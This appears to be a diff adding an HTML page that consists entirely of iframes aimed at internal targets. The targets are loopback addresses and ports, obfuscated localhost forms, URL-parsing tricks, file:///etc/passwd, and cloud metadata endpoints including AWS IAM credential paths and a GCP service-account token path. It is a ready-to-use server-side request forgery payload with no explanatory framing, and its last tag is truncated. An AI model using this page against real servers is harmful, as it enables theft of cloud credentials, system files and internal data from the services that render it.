@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+   <title>Iframes for a lot of URL's</title>
+</head>
+<body>
+   <h1>Iframes starts from here</h1>
+   <iframe src='http://127.0.0.1:80'></iframe>
+<iframe src='http://127.0.0.1:443'></iframe>
+<iframe src='http://127.0.0.1:22'></iframe>
+<iframe src='http://0.0.0.0:80'></iframe>
+<iframe src='http://0.0.0.0:443'></iframe>
+<iframe src='http://0.0.0.0:22'></iframe>
+<iframe src='http://localhost:80'></iframe>
+<iframe src='http://localhost:443'></iframe>
+<iframe src='http://localhost:22'></iframe>
+<iframe src='http://[::]:80/'></iframe>
+<iframe src='http://[::]:25/'></iframe>
+<iframe src='http://[::]:22/'></iframe>
+<iframe src='http://[::]:3128/'></iframe>
+<iframe src='http://0000::1:80/'></iframe>
+<iframe src='http://0000::1:25/'></iframe>
+<iframe src='http://0000::1:22/'></iframe>
+<iframe src='http://0000::1:3128/'></iframe>
+<iframe src='http://bugbounty.dod.network'></iframe>
+<iframe src='http://customer1.app.localhost.my.company.127.0.0.1.nip.io'></iframe>
+<iframe src='http://127.127.127.127'></iframe>
+<iframe src='http://127.0.1.3'></iframe>
+<iframe src='http://127.0.0.0'></iframe>
+<iframe src='http://[0:0:0:0:0:ffff:127.0.0.1]'></iframe>
+<iframe src='localhost:+11211aaa'></iframe>
+<iframe src='localhost:00011211aaaa'></iframe>
+<iframe src='http://0/'></iframe>
+<iframe src='http://127.1'></iframe>
+<iframe src='http://127.0.1'></iframe>
+<iframe src='http://127.1.1.1:80@127.2.2.2:80/'></iframe>
+<iframe src='http://127.1.1.1:80@@127.2.2.2:80/'></iframe>
+<iframe src='http://127.1.1.1:80:@@127.2.2.2:80/'></iframe>
+<iframe src='http://127.1.1.1:80#@127.2.2.2:80/'></iframe>
+<iframe src='file://path/to/file'></iframe>
+<iframe src='file:///etc/passwd'></iframe>
+<iframe src='file:////etc/passwd'></iframe>
+<iframe src='ssrf.php?url=file:///etc/passwd'></iframe>
+<iframe src='http://169.254.169.254'></iframe>
+<iframe src='http://metadata.nicob.net/'></iframe>
+<iframe src='http://169.254.169.254.xip.io/'></iframe>
+<iframe src='http://1ynrnhl.xip.io/'></iframe>
+<iframe src='http://www.owasp.org.1ynrnhl.xip.io/'></iframe>
+<iframe src='http://169.254.169.254/latest/user-data'></iframe>
+<iframe src='http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/ami-id'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/reservation-id'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/hostname'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/public-keys/'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access'></iframe>
+<iframe src='http://169.254.169.254/latest/dynamic/instance-identity/document'></iframe>
+<iframe src='http://169.254.169.254/latest/dynamic/instance-identity/document'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role'></iframe>
+<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role'></iframe>
+<iframe src='http://169.254.169.254/computeMetadata/v1/'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1/'></iframe>
+<iframe src='http://metadata/computeMetadata/v1/'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1/instance/hostname'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1/instance/id'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1/project/project-id'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1beta1/'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true'></iframe>
+<iframe src='http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1.json'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/id'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/user-data'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/hostname'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/region'></iframe>
+<iframe src='http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address'></iframe>
+<iframe src='http://169.254.169.254/metadata/instance?api-version=2017-04-02'></iframe>
+<iframe src='http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text'></iframe>
+<iframe src='http://169.254.169.254/openstack'></iframe>
+<iframe src='http://192.0.0.192/latest/'></iframe>
+<iframe src='http://192.0.0.192/latest/user-data/'></iframe>
+<iframe src='http://192.0.0.192/latest/meta-data/'></iframe>
+<iframe src='http://192.0.0.192/latest/attributes/'></if
+</body>
+</html>
